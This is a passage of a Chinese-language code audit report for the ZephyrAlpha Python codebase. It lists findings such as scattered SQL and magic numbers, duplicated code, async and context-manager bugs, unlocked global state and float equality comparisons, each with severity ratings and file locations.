+1. **[HIGH]** `d:\ZephyrAlpha\src\zephyr\governance\task_repo.py` — 单文件40+条裸SQL散落方法体（SELECT/INSERT INTO/UPDATE/DELETE FROM tasks/events/task_files），未集中到SQL常量
+2. **[HIGH]** `d:\ZephyrAlpha\scripts\governance\apply_depgraph.py` — 40+条裸SQL操作nodes/edges/blueprint_links表，散落业务逻辑
+3. **[HIGH]** `d:\ZephyrAlpha\src\zephyr\trading\orchestrator\file_task_mapper.py` ×4副本（含`state\`与`governance\audit_orchestration\`变体） — 同一文件复制4份，每份含13条SQL字面量
+4. **[HIGH]** `d:\ZephyrAlpha\src\zephyr\behavioral_audit\` 7文件 — drift_events相关SQL散落7+文件（含trigger DDL）
+5. **[HIGH]** `d:\ZephyrAlpha\src\zephyr\governance\secret_rotation_aware.py` ×2副本（含`infrastructure\rollback\`变体） — 硬编码4个secret rotation endpoint URL + ZEPHYR_API_KEY/JWT_SECRET字面量
+6. **[HIGH]** 3类安全扫描器（`d:\ZephyrAlpha\src\zephyr\infrastructure\auto_fix_engine\fix_safety.py`+`d:\ZephyrAlpha\src\zephyr\security\access_control\auto_fix_engine_03\fix_safety.py`+`d:\ZephyrAlpha\scripts\governance\d6_security\scan_secret_leak.py`+`d:\ZephyrAlpha\scripts\arch_guard\fitness_functions\check_log_secret_leak.py`） — 密钥检测正则各自定义，长度阈值不一致（{20,} vs {32,}）
+
+#### MEDIUM（17个）
+
+7. **[MEDIUM]** `d:\ZephyrAlpha\src\zephyr\integration\llm_gateway.py`+`d:\ZephyrAlpha\src\zephyr\autonomy_core\llm_gateway.py`+`d:\ZephyrAlpha\src\zephyr\infrastructure\pipeline\llm_gateway.py` — LLM cost硬编码3份llm_gateway.py
+8. **[MEDIUM]** 同上3份llm_gateway.py — deepseek cost数值不一致（0.001 vs 0.00174两处）
+9. **[MEDIUM]** Ollama URL 7+文件硬编码
+10. **[MEDIUM]** OTLP endpoint 6+文件硬编码
+11. **[MEDIUM]** TaskStatus字符串散落30+处（Enum已存在未使用）
+12. **[MEDIUM]** timeout散落80+处
+13. **[MEDIUM]** PRAGMA散落15+文件
+14. **[MEDIUM]** ThreadPoolExecutor max_workers=8散落15+处
+15. **[MEDIUM]** time.sleep散落28+处
+16. **[MEDIUM]** max_retries=3散落7+处
+17. **[MEDIUM]** benchmark max_tokens硬编码28次×2副本
+18. **[MEDIUM]** audit路径硬编码10文件×2副本
+19. **[MEDIUM]** session_lifecycle路径硬编码
+20. **[MEDIUM]** SEMVER正则重复定义
+21. **[MEDIUM]** frontmatter正则重复定义
+22. **[MEDIUM]** header_field正则重复定义
+23. **[MEDIUM]** hallucination_pattern正则重复定义
+
+#### LOW（4个）
+
+24. **[LOW]** HTTP 200状态码字面量硬编码9处（未用HTTPStatus枚举）
+25. **[LOW]** 错误消息模板重复5+文件（中英双语模板各自定义）
+26. **[LOW]** 退避参数（backoff factor/base）散落硬编码
+27. **[LOW]** 单次硬编码值（一次性魔数未提取常量）
+
+**核心模式总结**：(1)6处HIGH中4处为"裸SQL散落"（task_repo/apply_depgraph/file_task_mapper×4/behavioral_audit 7文件），SQL未集中到常量模块是规模化现象；(2)3类安全扫描器正则阈值不一致（{20,} vs {32,}）是安全检测一致性问题；(3)17处MEDIUM多为"配置值散落N+文件"（Ollama URL/OTLP/timeout/PRAGMA/max_workers等），应抽取到统一配置；(4)4处正则重复（SEMVER/frontmatter/header_field/hallucination_pattern）应集中到共享正则模块
+
+**严重度汇总**：HIGH=6, MEDIUM=17, LOW=4, 合计=27
+
+---
+
+### 5.161 重复代码块（4个，第27轮新增）
+
+#### HIGH（1个）
+
+1. **[HIGH]** `d:\ZephyrAlpha\src\zephyr\trading\orchestrator\state_synchronizer.py:252-317` ↔ `d:\ZephyrAlpha\src\zephyr\trading\orchestrator\file_task_mapper.py:350-400` ×4副本 — `_check_and_fix`/`_check_consistency` 一致性检查逻辑~40行重复（6个if分支完全一致）
+
+#### MEDIUM（2个）
+
+2. **[MEDIUM]** `_read_frontmatter_status` 方法15行跨类复制（`d:\ZephyrAlpha\src\zephyr\trading\orchestrator\state_synchronizer.py` + `d:\ZephyrAlpha\src\zephyr\trading\orchestrator\file_task_mapper.py` ×4副本）
+3. **[MEDIUM]** `check_registry_parsable` 函数15-24行跨包复制（`d:\ZephyrAlpha\src\zephyr\behavioral_audit\self_check.py` ↔ `d:\ZephyrAlpha\src\zephyr\governance\drift_detection\self_check.py`，相似度>95%）
+
+#### LOW（1个）
+
+4. **[LOW]** `now_iso()` 函数3-4行私有复制绕过SSoT（`d:\ZephyrAlpha\src\zephyr\governance\base_repo.py:181` + `d:\ZephyrAlpha\src\zephyr\governance\task_repo.py:308`，真源在`d:\ZephyrAlpha\src\zephyr\shared\utils\time_utils.py:112`）
+
+**核心模式总结**：(1)最高危是state_synchronizer↔file_task_mapper×4副本的一致性检查逻辑~40行逐字重复，源于file_task_mapper被复制4份（与5.159死代码、5.160魔法数同源）；(2)跨包函数复制（check_registry_parsable）表明behavioral_audit与drift_detection历史split未清理；(3)now_iso私有复制是SSoT违规的典型——真源已存在却绕过
+
+**严重度汇总**：HIGH=1, MEDIUM=2, LOW=1, 合计=4
+
+---
+
+### 5.162 异步代码正确性（34个，第27轮新增）
+
+#### HIGH（8个）
+
+1. **[HIGH]** `d:\ZephyrAlpha\src\zephyr\integration\mcp\task_manager_server.py:135` — `create_task` async MCP tool直接调用同步SQLite/文件IO
+2. **[HIGH]** `d:\ZephyrAlpha\src\zephyr\integration\mcp\task_manager_server.py:249` — `get_task` async内同步IO
+3. **[HIGH]** `d:\ZephyrAlpha\src\zephyr\integration\mcp\task_manager_server.py:258` — `list_tasks` async内同步IO
+4. **[HIGH]** `d:\ZephyrAlpha\src\zephyr\integration\mcp\task_manager_server.py:280` — `update_task_status` async内同步IO
+5. **[HIGH]** `d:\ZephyrAlpha\src\zephyr\integration\mcp\task_manager_server.py:296` — `decompose_blueprint` async内同步IO
+6. **[HIGH]** `d:\ZephyrAlpha\src\zephyr\integration\mcp\task_manager_server.py:313` — `register_from_triage` async内同步IO
+7. **[HIGH]** `d:\ZephyrAlpha\src\zephyr\integration\mcp\telemetry_server.py:127` — `_alerts_status` async内同步文件读
+8. **[HIGH]** `d:\ZephyrAlpha\src\zephyr\integration\mcp\telemetry_server.py:180` — `_schema_info` async内同步文件读
+
+#### MEDIUM（25个，按反模式分组）
+
+9. **[MEDIUM×13]** C1模式 — LSG安全网关同步包装器采用"asyncio.run + get_event_loop回退 + is_running()静默返回None"反模式，async上下文调用fail-open绕过九层纵深防御（`d:\ZephyrAlpha\src\zephyr\integration\llm_gateway.py`×3 + `d:\ZephyrAlpha\src\zephyr\integration\mcp\gateway_server.py`×2 + `d:\ZephyrAlpha\src\zephyr\governance\default_security_gateway.py`×3 + `d:\ZephyrAlpha\src\zephyr\infrastructure\a2a_protocol\`×3 + `d:\ZephyrAlpha\src\zephyr\autonomy_core\agent_orchestrator.py`×2）
+10. **[MEDIUM×4]** C2模式 — async上下文RuntimeError崩溃（`d:\ZephyrAlpha\src\zephyr\governance\escalation_engine.py:464` + `d:\ZephyrAlpha\src\zephyr\governance\delegation_engine.py:246` + `d:\ZephyrAlpha\src\zephyr\governance\rollback_executor.py` + `d:\ZephyrAlpha\src\zephyr\infrastructure\rollback\rollback_executor.py`）
+11. **[MEDIUM×4]** C3模式 — `except Exception: pass` 静默绕过安全扫描（`d:\ZephyrAlpha\src\zephyr\governance\llm_impact_analyzer.py`×2 + `d:\ZephyrAlpha\src\zephyr\ops\evolution_engine.py:351` + `d:\ZephyrAlpha\src\zephyr\governance\kb\ingest.py:216`）
+12. **[MEDIUM×3]** C4模式（`d:\ZephyrAlpha\src\zephyr\infrastructure\governance_server.py`×2 + `d:\ZephyrAlpha\src\zephyr\integration\mcp\governance_server.py` + `d:\ZephyrAlpha\src\zephyr\security\llm_defense\llm_security_01\context_scanner.py:119`）
+13. **[MEDIUM×1]** C5模式 — 废弃API（`d:\ZephyrAlpha\src\zephyr\governance\drift_detector.py:117`）
+
+#### LOW（1个）
+
+14. **[LOW]** `d:\ZephyrAlpha\src\zephyr\behavioral_audit\chaos_injector.py:398` — sync函数内asyncio.run，若被async路径复用会崩溃
+
+**核心模式总结**：(1)8处HIGH均为async MCP tool直接调用同步SQLite/文件IO，阻塞事件循环；(2)25处MEDIUM中C1模式最危险——13处LSG安全网关同步包装器在async上下文静默返回None，fail-open绕过九层纵深防御；C2模式4处在async上下文RuntimeError崩溃；C3模式4处except:pass静默绕过安全扫描；(3)C5模式使用废弃asyncio API
+
+**严重度汇总**：HIGH=8, MEDIUM=25, LOW=1, 合计=34
+
+---
+
+### 5.163 上下文管理器正确性（7个，第27轮新增）
+
+#### HIGH（1个）
+
+1. **[HIGH]** `d:\ZephyrAlpha\scripts\governance\_concurrency.py:313` — `ProcessLock.__enter__` 调用 `self.acquire()` 但忽略其返回值（`LockAcquireResult.acquired` 可为 False），锁未获取仍返回 self，with 块在无锁保护下执行
+
+#### MEDIUM（3个）
+
+2. **[MEDIUM]** `d:\ZephyrAlpha\src\zephyr\governance\task_repo.py:657` — `_write_tx` @contextmanager 用 `except Exception`（非 BaseException）且无 finally，Ctrl+C/SystemExit 时 ROLLBACK 被跳过，SQLite BEGIN IMMEDIATE 写锁泄漏
+3. **[MEDIUM]** `d:\ZephyrAlpha\src\zephyr\shared\io\file_utils.py:255` — `backup_and_rollback` @contextmanager 用 `except Exception`，BaseException 时 `restore_backup` 被跳过，文件停留在半修改状态
+4. **[MEDIUM]** `d:\ZephyrAlpha\src\zephyr\infrastructure\system_telemetry\facade.py:279` — `_RealSpanBridge.__exit__` 未将 `_ctx` 置 None，且 `end()`(:286) 再次调用 `_ctx.__exit__(...)`，与同类 `_Span.__exit__` 行为不一致，重复退出风险
+
+#### LOW（3个）
+
+5. **[LOW]** `d:\ZephyrAlpha\src\zephyr\infrastructure\system_telemetry\traces\span_stub.py:210` — `noop_span` @contextmanager 用 `except Exception`，BaseException 时 span 未调用 finish("ERROR")
+6. **[LOW]** `d:\ZephyrAlpha\src\zephyr\ops\observability\tracing.py:121` — `start_span` @contextmanager 用 `except Exception`，BaseException 时 span 状态未置 ERROR
+7. **[LOW]** `d:\ZephyrAlpha\src\zephyr\shared\observability_02\tracing.py:121` — `start_span` 同上模式副本
+
+**核心模式总结**：(1)最严重是 `@contextmanager` 生成器用 `except Exception` 而非 `except BaseException`——5处（task_repo/file_utils/span_stub/tracing×2）在 KeyboardInterrupt/SystemExit 时回滚/状态标记被跳过，其中 task_repo._write_tx 泄漏 SQLite 写锁、backup_and_rollback 破坏原子回滚契约；(2)ProcessLock.__enter__ 忽略 acquire() 返回值使互斥契约静默失效；(3)_RealSpanBridge 的 __exit__/end() 双路径未对齐是 CM 清理非幂等隐患
+
+**严重度汇总**：HIGH=1, MEDIUM=3, LOW=3, 合计=7
+
+---
+
+### 5.164 装饰器误用（3个，第27轮新增）
+
+#### LOW（3个）
+
+1. **[LOW]** `d:\ZephyrAlpha\src\zephyr\governance\query_metrics.py:234` — `QueryMetrics.track` 装饰器的 `wrapper` 未使用 `@functools.wraps(func)`，改在 261-262 行手动赋值 `__name__`/`__doc__`，丢失 `__qualname__`/`__module__`/`__wrapped__`/`__annotations__`（inspect.signature 无法穿透）
+2. **[LOW]** `d:\ZephyrAlpha\src\zephyr\shared\infra\limiter.py:187` — `async_limited` 装饰器的 `async def wrapper` 未使用 `@functools.wraps(func)`，改手动复制 `__name__`/`__qualname__`/`__doc__`，缺失 `__module__`/`__wrapped__`/`__dict__`/`__annotations__`
+3. **[LOW]** `d:\ZephyrAlpha\src\zephyr\shared\infra_06\limiter.py:183` — `async_limited`（与 shared/infra/limiter.py 近似重复文件）同样未用 `@functools.wraps`
+
+**核心模式总结**：审计范围内自定义装饰器整体规范度高（18处 return wrapper 型装饰器中15处正确使用 @functools.wraps），3处偏离均表现为"未用 wraps 但手动复制 __name__/__doc__"，故 __name__/__doc__ 实际未丢失，影响仅限 __wrapped__/__module__/__annotations__ 缺失及 inspect.signature 不可穿透。两处 async_limited 为近乎逐行重复实现，同一瑕疵被复制
+
+**严重度汇总**：HIGH=0, MEDIUM=0, LOW=3, 合计=3
+
+---
+
+### 5.165 全局状态管理（44个，第27轮新增）
+
+#### HIGH（6个）
+
+1. **[HIGH]** `d:\ZephyrAlpha\src\zephyr\__init__.py:125` — 模块级 `threading.Timer(0.05, _deferred_bootstrap)` 在 import 时启动后台线程执行 auto_bootstrap 重操作，`_deferred_bootstrap`(L116) 修改 `global _auto_bootstrap_result`(L112) 无锁；L142 第二个 Timer 同理
+2. **[HIGH]** `d:\ZephyrAlpha\src\zephyr\behavioral_audit\baseline_poisoning_guard.py:98` — `HASH_CHAIN: list = []` 和 `INTEGRITY_MANIFEST: dict = {}`(L101) 模块级可变状态，被 `build_hash_chain`(L225 append) 和 `generate_integrity_manifest`(L266 重新赋值) 多函数共享修改，无 threading.Lock（完整性链关键状态）
+3. **[HIGH]** `d:\ZephyrAlpha\src\zephyr\behavioral_audit\drift_infrastructure.py:69` — `_budgets: dict` 模块级可变状态，`get_or_create_budget`(L106/L110) 修改无锁；`_last_window`(L66)/`_checkpoints_dir`(L72) 同理无锁
+4. **[HIGH]** `d:\ZephyrAlpha\src\zephyr\integration\vector_memory\context_ingest.py:35` — `_in_memory_collections: dict = {}` 模块级缓存，`_ingest_memory`(L88/L90/L94 修改) 和 `query`(L104 读取) 共享，无锁且无 clear/expire（无界增长）
+5. **[HIGH]** `d:\ZephyrAlpha\src\zephyr\behavioral_audit\file_attr_checker.py:71` — `_FILE_ATTR_CACHE: dict = {}` 模块级缓存，`capture_baseline`(L90/L96) 修改无锁，无 clear/expire
+6. **[HIGH]** `d:\ZephyrAlpha\src\zephyr\autonomy_core\context_assembler.py:615` — `_KBS_CACHE` 模块级单例缓存，`_get_or_init_kb`(L619/L632) 修改无锁，KB bootstrap 为重操作
+
+#### MEDIUM（28个）
+
+7. **[MEDIUM]** `d:\ZephyrAlpha\src\zephyr\governance\adapter.py:91` — `_cache_lock` 延迟创建竞态：`_get_engine`(L95) 在 L104 检查 `_cache_lock is None` 后才 `Lock()`，多线程可创建不同 Lock 实例；`_engine_cache` 无失效机制
+8. **[MEDIUM]** `d:\ZephyrAlpha\src\zephyr\autonomy_core\context_budget_tracker.py:68` — `_context_rules_cache` 模块级缓存，`_load_context_rules_yaml`(L77/L86/L90) 修改无锁，无失效机制
+9. **[MEDIUM]** `d:\ZephyrAlpha\src\zephyr\shared\state_machine.py:342` — `_registry` 模块级单例，`get_state_machine_registry`(L346/L348) 修改无锁
+10. **[MEDIUM]** `d:\ZephyrAlpha\src\zephyr\shared\schema\schema_registry.py:193` — `_global_schema_registry` 模块级单例，`get_schema_registry`(L197/L199) 修改无锁
+11. **[MEDIUM]** `d:\ZephyrAlpha\src\zephyr\trading\orchestrator\core\task_queue.py:151` — `_queue` 模块级单例，`get_queue`(L158/L160) 修改无锁
+12. **[MEDIUM]** `d:\ZephyrAlpha\src\zephyr\shared\observability_02\metrics.py:262` — `_global_registry` 模块级单例，`get_registry`(L266/L268) 修改无锁
+13. **[MEDIUM]** `d:\ZephyrAlpha\src\zephyr\trading\finalizer.py:96` — `_global_finalizer` 模块级单例，`get_finalizer`(L101/L103) 修改无锁
+14. **[MEDIUM]** `d:\ZephyrAlpha\src\zephyr\governance\knowledge_engine.py:72` — `_knowledge_index` 模块级单例，`get_index`(L76/L78) 修改无锁
+15. **[MEDIUM]** `d:\ZephyrAlpha\src\zephyr\trading\orchestrator\fault_types.py:157` — `_DEFAULT_REGISTRY` 模块级单例，`get_default_registry`(L161/L163) 修改无锁且注册多个 fault
+16. **[MEDIUM]** `d:\ZephyrAlpha\src\zephyr\integration\layer_router.py:401` — `_singleton_router` 模块级单例，`get_layer_router`(L410/L412) 修改无锁
+17. **[MEDIUM]** `d:\ZephyrAlpha\src\zephyr\shared\contracts\core\registry.py:368` — `_registry` 模块级单例，`get_registry`(L372/L374) 修改无锁且调用 initialize()
+18. **[MEDIUM]** `d:\ZephyrAlpha\src\zephyr\shared\foundation\env.py:88` — `_CURRENT_ENV` 模块级单例，`current_env`(L92/L94) 修改无锁
+19. **[MEDIUM]** `d:\ZephyrAlpha\src\zephyr\shared\session_continuity.py:76` — `_DEFAULT_DB` 模块级单例，`_get_default_db`(L80/L85) 修改无锁
+20. **[MEDIUM]** `d:\ZephyrAlpha\src\zephyr\ops\telemetry.py:36` — `_sys_telemetry` 模块级单例，`_get_sys_telemetry`(L40/L45) 修改无锁
+21. **[MEDIUM]** `d:\ZephyrAlpha\src\zephyr\autonomy_core\pattern_library.py:546` — `_default_dangerous_library` 模块级单例，`_get_default_library`(L602/L604) 修改无锁
+22. **[MEDIUM]** `d:\ZephyrAlpha\src\zephyr\trading\ide_health_daemon.py:427` — `_daemon_instance` 模块级单例无锁，`register_daemon`(L431/L434) 内自动调用 `registry.start()`(L444) 启动守护进程（import 时执行重操作风险）
+23. **[MEDIUM]** `d:\ZephyrAlpha\src\zephyr\behavioral_audit\resource_guard.py:213` — `_guard_running` 模块级标志，`guard_loop`(L237/L271) 和 `stop_guard_loop`(L277) 修改无锁；同模块 `_current_pool_size` 用了 `_guard_lock` 但 `_guard_running` 未用，锁策略不一致
+24. **[MEDIUM]** `d:\ZephyrAlpha\src\zephyr\behavioral_audit\drift_engine.py:100` — `_shutting_down` 模块级标志，signal handler `_handler`(L164/L166) 设置，async 函数 `_dispatch_detector`(L383/L386) 读取 — asyncio + 全局可变状态冲突
+25. **[MEDIUM]** `d:\ZephyrAlpha\src\zephyr\autonomy_core\llm_gateway.py:42` — `_lsg_gateway` 模块级单例无锁，`_lsg_scan_input_sync`(L69) 使用 `asyncio.run` 混合全局状态 — asyncio + 全局可变状态冲突
+26. **[MEDIUM]** `d:\ZephyrAlpha\src\zephyr\governance\default_security_gateway.py:49` — `_lsg_gateway` 模块级单例无锁（同一模式在 `integration\llm_gateway.py:42`、`integration\mcp\gateway_server.py:69`、`infrastructure\gateway_server.py:69`、`governance\implementations\default_security_gateway.py:49`、`governance\compliance_gate_a6\default_security_gateway.py:53`、`infrastructure\a2a_protocol\legacy_governance_adapter.py:43` 重复共7处）
+27. **[MEDIUM]** `d:\ZephyrAlpha\src\zephyr\autonomy_core\context_injector.py:452` — `_CE_TIMEOUT_METRIC += 1`(L453) 模块级计数器自增无锁
+28. **[MEDIUM]** `d:\ZephyrAlpha\src\zephyr\shared\utils\testing.py:80` — `_task_counter` 模块级计数器，`_next_task_seq`(L84/L85) `+= 1` 无锁；同模式 `_audit_counter`(L158)、`_ke_counter`(L198)、`_pattern_counter`(L228) 均无锁
+29. **[MEDIUM]** `d:\ZephyrAlpha\src\zephyr\shared\utils\time_utils.py:137` — `MOCKED_TIME` 模块级全局，`freeze_time`(L147/L151) 修改无锁，多线程测试下竞态
+30. **[MEDIUM]** `d:\ZephyrAlpha\src\zephyr\behavioral_audit\drift_engine.py:97` — `_ENGINE_ROOT` 和 `_REGISTRY_PATH` 模块级，`_resolve_paths`(L104/L106/L108) 修改无锁
+31. **[MEDIUM]** `d:\ZephyrAlpha\scripts\governance\run_all.py:269` — `_REGISTRY_CACHE` 模块级缓存，`load_registry`(L269/L271) 修改无锁，无失效机制
+32. **[MEDIUM]** `d:\ZephyrAlpha\scripts\governance\status.py:100` — `_SCRIPT_HEALTH_CACHE` 模块级缓存，`_get_script_health_checks`(L109/L111) 修改无锁，无失效机制
+33. **[MEDIUM]** `d:\ZephyrAlpha\scripts\governance\d2_links\audit_broken_links.py:300` — `_VALID_BLUEPRINT_IDS` 模块级缓存，`_get_valid_blueprint_ids`(L300/L303) 修改无锁，无失效机制
+34. **[MEDIUM]** `d:\ZephyrAlpha\scripts\mcp\launcher.py:220` — `_gateway` 模块级单例无锁，`_graceful_shutdown`(L220/L229) 和 `launch_all`(L240) 修改
+
+#### LOW（10个）
+
+35. **[LOW]** `d:\ZephyrAlpha\scripts\ops\verify_header_completeness.py:142` — `global files_scanned`/`files_no_header`/`files_complete`/`files_missing_req` 滥用 global 替代返回值
+36. **[LOW]** `d:\ZephyrAlpha\scripts\ops\recover_git_headers.py:103` — `global files_fixed`/`values_restored` 滥用 global 计数器
+37. **[LOW]** `d:\ZephyrAlpha\scripts\ops\normalize_headers.py:45` — `global files_fixed` 滥用 global 计数器
+38. **[LOW]** `d:\ZephyrAlpha\scripts\ops\migrate_docstring_headers.py:54` — `global files_scanned, files_fixed, fields_migrated, docstrings_cleaned` 一次4个 global 计数器滥用
+39. **[LOW]** `d:\ZephyrAlpha\scripts\ops\final_header_cleanup.py:49` — `global files_fixed, blueprints_fixed, docstrings_cleaned` 滥用 global 计数器
+40. **[LOW]** `d:\ZephyrAlpha\scripts\ops\dedup_header_fields.py:63` — `global files_fixed`/`values_restored`/`dups_removed` 滥用 global 计数器
+41. **[LOW]** `d:\ZephyrAlpha\scripts\ops\cleanup_duplicate_headers.py:47` — `global files_fixed`/`blueprints_updated` 滥用 global 计数器
+42. **[LOW]** `d:\ZephyrAlpha\scripts\ops\align_header_ten_fields.py:76` — `global files_scanned, files_complete, files_fixed`/`files_skipped_init` 滥用 global 计数器
+43. **[LOW]** `d:\ZephyrAlpha\scripts\a2a_full_verification.py:25` — `global score, total` 在 `check()` 内滥用 global 替代返回值
+44. **[LOW]** `d:\ZephyrAlpha\src\zephyr\trading\autopilot.py:188` — `_subscribed` 幂等订阅标志无锁（同模式系统性重复于 `boot_hooks.py:141/160`、`budget_engine.py:726`、`pipeline_orchestrator.py:2387/2400`、`f5_event_subscriber.py:586`、`governance\adapter.py:207/211`、`observability_02\metrics.py:274/288`、`observability_02\health.py:266/281`、`trading\finalizer.py:53/66`、`governance\_service_registration.py:34/39`、`runtime_interceptor.py:360/385` 共11+处）
+
+**核心模式总结**：(1)系统性"模块级单例/缓存 + 无锁 double-check"反模式——约20处 `_<name> = None` 单例通过 `if _x is None: _x = Y()` 惰性初始化但均无 threading.Lock 保护（仅 `unified_memory_api.py:354`、`trigger_router.py:581` 等3处正确使用 `_singleton_lock`）；(2)最严重是 `__init__.py:125` 在 import 时启动后台 Timer 执行 bootstrap、`baseline_poisoning_guard.py` 完整性链状态无锁、`drift_engine.py`/`llm_gateway.py` 的 asyncio + 全局可变状态混用；(3)scripts/ops/*.py 普遍滥用 global 计数器替代函数返回值，应重构为返回值或 dataclass 累加器
+
+**严重度汇总**：HIGH=6, MEDIUM=28, LOW=10, 合计=44
+
+---
+
+### 5.166 可变默认参数（0个，第28轮新增）
+
+**审计结论**：对 `d:\ZephyrAlpha\src\zephyr\**\*.py` 和 `d:\ZephyrAlpha\scripts\**\*.py`（已排除 tests/、_archive/、_working/、.runtime/、build/、dist/、__pycache__/）执行全量扫描，**未发现任何可变默认参数反模式**。
+
+**验证方法**：
+1. 类型特定锚定正则 `def \w+\([^)]*= *(?:\[\]|\{\}|set\(\)|defaultdict\(|OrderedDict\(|Counter\(|dict\(\)|list\(\)|bytearray\(\))` 全代码库零匹配
+2. 宽松正则兜底扫描 `def .*=\s*\[`、`def .*\{\}`、`= set()`/`= defaultdict(...)`/`= Counter()`/`= OrderedDict()` 全量逐项排查，所有命中均为函数体内局部变量赋值、`__init__` 实例属性或模块级注解赋值
+3. 模式7（任意可变构造器默认）专项扫描：通用构造器调用默认 4 命中全部不可变（`Path("docs")`、`str(DB_PATH)` ×2、`Decimal("0.10")`）；dotted 模块限定构造器默认零匹配；额外可变类型 `=deque()/=Queue()/=SimpleQueue()/=PriorityQueue()/=ChainMap(` 零匹配
+
+**正面证据**：开发者一致采用 `T | None = None` 哨兵模式配合函数体内 `or`/条件初始化（如 `d:\ZephyrAlpha\src\zephyr\infrastructure\asset_inventory\scanner.py:79-90` 的 `Scanner.__init__`：`excludes: set[str] | None = None` → `self.excludes = excludes or DEFAULT_EXCLUDES`），从根源上规避了共享可变默认值陷阱。可变容器（`set`/`defaultdict`/`Counter`/`OrderedDict`）均以函数体内局部变量或 `__init__` 实例属性形式初始化，不存在跨调用状态泄漏风险。
+
+**核心模式总结**：零检出维度。整个代码库在函数默认参数上严格遵守 Python 最佳实践，开发者具备可变默认参数陷阱意识并一致采用哨兵模式，证明该规范执行良好。
+
+**严重度汇总**：HIGH=0, MEDIUM=0, LOW=0, 合计=0
+
+---
+
+### 5.167 比较运算正确性（22个，第28轮新增）
+
+#### HIGH（1个）
+
+1. **[HIGH]** `d:\ZephyrAlpha\src\zephyr\governance\backtest_engine.py:87` — 浮点 == 阈值比较 `std == 0`，std 为 statistics.stdev(daily_returns) 返回的浮点标准差，作为 Sharpe 比率分母守卫（金融场景；std 极小非零时 Sharpe 异常放大，可能误导投资决策）
+
+#### MEDIUM（8个）
+
+1. **[MEDIUM]** `d:\ZephyrAlpha\src\zephyr\governance\roi_calculator.py:49` — 浮点 == 累积统计 `self._total_spent_cost == 0`，_total_spent_cost 为 float 类型经由 `+= cost` 累积的成本（金融场景累积统计，应使用 `<= 0` 或 epsilon）
+2. **[MEDIUM]** `d:\ZephyrAlpha\src\zephyr\governance\anti_automation_bias.py:283` — 浮点 == 分母守卫 `older_avg == 0`，older_avg 为 sum(response_times)/half 的浮点平均值（后续作为除数，应使用 `< epsilon`）
+3. **[MEDIUM]** `d:\ZephyrAlpha\src\zephyr\governance\audit_trail\anomaly.py:46` — 浮点 == 分母守卫 `std_dev == 0`，std_dev 为 variance**0.5 计算的浮点标准差，z-score 分母守卫
+4. **[MEDIUM]** `d:\ZephyrAlpha\src\zephyr\governance\audit_orchestrator\anomaly.py:46` — 浮点 == 分母守卫 `std_dev == 0`（重复文件，同上）
+5. **[MEDIUM]** `d:\ZephyrAlpha\src\zephyr\behavioral_audit\contract_drift_detector.py:59` — 浮点 == 分母守卫 `baseline_std == 0`，baseline_std 为浮点标准差，z-score 分母守卫（虽补偿为 0.001 但极小非零值仍漏过）
+6. **[MEDIUM]** `d:\ZephyrAlpha\src\zephyr\simulation\pipeline_base.py:95` — 浮点 == 分母守卫 `pooled_std == 0`，Cohen's d 效应量分母守卫
+7. **[MEDIUM]** `d:\ZephyrAlpha\src\zephyr\simulation\implementations\default_experiment_pipeline.py:113` — 浮点 == 分母守卫 `pooled_std == 0`（重复文件）
+8. **[MEDIUM]** `d:\ZephyrAlpha\scripts\calibrate_model_diff.py:130` — 浮点 == 分母守卫 `b.overall_score == 0`，overall_score 为浮点模型评分，作为除数 ratio 守卫
+
+#### LOW（13个）
+
+1. **[LOW]** `d:\ZephyrAlpha\src\zephyr\governance\pricing_sync.py:126` — 浮点 == 哨兵检查 `input_price == 0.0 and output_price == 0.0`，值直接来自 JSON .get() 默认 0.0 无算术（同文件 134 行已正确使用 abs() > 1e-8）
+2. **[LOW]** `d:\ZephyrAlpha\src\zephyr\intelligence\model_profiling\profiler.py:574` — 浮点 == 显示逻辑 `p.average_score == 0`，average_score 为浮点平均分，仅用于跳过显示
+3. **[LOW]** `d:\ZephyrAlpha\src\zephyr\intelligence\model_profiling\pipeline_routing\profiler.py:604` — 浮点 == 显示逻辑（重复文件）
+4. **[LOW]** `d:\ZephyrAlpha\src\zephyr\trading\orphan_detector.py:95` — 浮点 == 哨兵检查 `compute_orphan_rate() == 0.0`，0/total 在 IEEE754 中精确为 0.0（功能正确）
+5. **[LOW]** `d:\ZephyrAlpha\src\zephyr\security\access_control\orphan_judge\orphan_detector.py:165` — 浮点 == 哨兵检查（重复文件）
+6. **[LOW]** `d:\ZephyrAlpha\src\zephyr\governance\orphan_judgment\orphan_detector.py:164` — 浮点 == 哨兵检查（重复文件）
+7. **[LOW]** `d:\ZephyrAlpha\src\zephyr\governance\output_quality_gate.py:64` — 浮点 == 哨兵检查 `scores[-1] == 0.0`，_check_placeholder 显式返回 0.0 作为标记值（功能正确）
+8. **[LOW]** `d:\ZephyrAlpha\src\zephyr\ops\gates\deployment_suppression.py:65` — 浮点 == 时间戳哨兵 `self.stable_since == 0.0`，0.0 表示"未初始化"标记值
+9. **[LOW]** `d:\ZephyrAlpha\src\zephyr\ops\circuit_breaker.py:104` — 浮点 == 时间戳哨兵 `self._last_failure_time == 0.0`
+10. **[LOW]** `d:\ZephyrAlpha\src\zephyr\ops\forensic\state_migration_validator.py:81` — 浮点 == 哨兵检查 `divergence_pct == 0`，100.0 * 0 / max(len,1) 在 IEEE754 中精确为 0.0（功能正确）
+11. **[LOW]** `d:\ZephyrAlpha\src\zephyr\intelligence\model_evaluation\implementations\default_backtest_engine.py:103` — 浮点 == 哨兵检查 `total_signal == 0`，pandas Series 空集 sum()=0.0（功能正确）
+12. **[LOW]** `d:\ZephyrAlpha\src\zephyr\simulation\default_backtest_engine.py:103` — 浮点 == 哨兵检查（重复文件）
+13. **[LOW]** `d:\ZephyrAlpha\scripts\construction\demo_e2e_pipeline.py:405` — 浮点 != 比较 `report.slippage_bps != 0`，slippage_bps 为 float 类型（demo 脚本，仅用于断言显示）
+
